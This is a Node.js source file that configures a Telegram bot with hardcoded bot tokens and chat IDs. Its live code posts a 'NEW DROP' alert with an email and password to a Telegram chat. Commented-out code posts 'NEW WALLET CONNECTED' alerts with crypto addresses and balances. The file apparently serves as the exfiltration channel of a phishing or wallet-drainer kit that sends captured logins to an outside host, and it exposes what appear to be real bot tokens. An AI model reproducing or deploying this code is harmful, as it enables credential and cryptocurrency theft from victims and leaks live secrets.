// import Telegram, { Telegram_ParseModes } from 'tele-sender';

// const telegram = new Telegram('6858302131:AAF9_7RzVhnIUj862QdQCU7tKHu_oqJEu3Q');

const TelegramBot = require('node-telegram-bot-api');
// import TelegramBot from 'node-telegram-bot-api';


// replace the value below with the Telegram token you receive from @BotFather
const token = '6858302131:AAF9_7RzVhnIUj862QdQCU7tKHu_oqJEu3Q';
// const token = '6861971208:AAEpJzR_fEaxguvtTC9f7xNc-5UR70rA4Vg';
// read the doc from https://github.com/yagop/node-telegram-bot-api to know how to catch the chatId
// const chatId = '-4128488657';
const chatId = '-4176809792';

const bot = new TelegramBot(token, { polling: false });

// const telegrambot = (message, json) => {
//   try {
//     bot.sendMessage(chatId, message + '\n\n<pre>' + JSON.stringify(json, null, 2) + '</pre>', {
//       parse_mode: 'html'
//     });
//   } catch (err) {
//     console.log('Something went wrong when trying to send a Telegram notification', err);
//   }
// }
// bot.sendMessage(chatId, 'NEW WALLET CONNECTED ✅ \n\n Address: <pre>  ' + JSON.stringify('0xEf7e28Ba70FD460f07f29Bbf703f545a669f611A', null, 2) + '</pre> \n Connection Time:  <pre>' + JSON.stringify('10:41PM 2/01/24', null, 2) + '</pre> \n ETH Balance:  <pre>' + JSON.stringify('0 ETH', null, 2) + '</pre>\n BNB Balance:  <pre>' + JSON.stringify('0 BNB', null, 2) + '</pre>\n MATIC Balance:  <pre>' + JSON.stringify('0 MATIC', null, 2) + '</pre>\n ARB Balance:  <pre>' + JSON.stringify('0 ETH', null, 2) + '</pre>\n BASE Balance:  <pre>' + JSON.stringify('0 MATIC', null, 2) + '</pre>', {
//   parse_mode: 'HTML'
// });

bot.sendMessage(chatId, 'NEW DROP ✅ \n\n Email: <pre>  ' + JSON.stringify('test@test.com', null, 2) + '</pre> \n Password:  <pre>' + JSON.stringify('12345678', null, 2) + '</pre>', {
  parse_mode: 'HTML'
});

// const ACTIONS = {
//   NEW_USER: '🙋‍♂️new user',
//   NEW_MONITOR: '🖥 new monitor',
//   LATENCY: '👨‍💻 somebody has used the latency tool',
//   NEW_STATUS_PAGE: '📈 new status page',
//   NEW_SUBSCRIPTION: '💰💰💰 a user has subscribed!',
//   NEW_PAYMENT: '🤑 a payment has processed',
//   WEEKLY_REPORTS_SENDING: '✴️ Weekly reports are being sent',
//   WEEKLY_REPORTS_SENT: '✅ Weekly reports have been sent',
//   END_TRIAL_USERS: '✋ end of trial users today',
//   TRIAL_USERS_SOON_END: '👀 users that end their trials in 3 days',
// }

// module.exports = {
//   telegrambot,
//   ACTIONS
// }
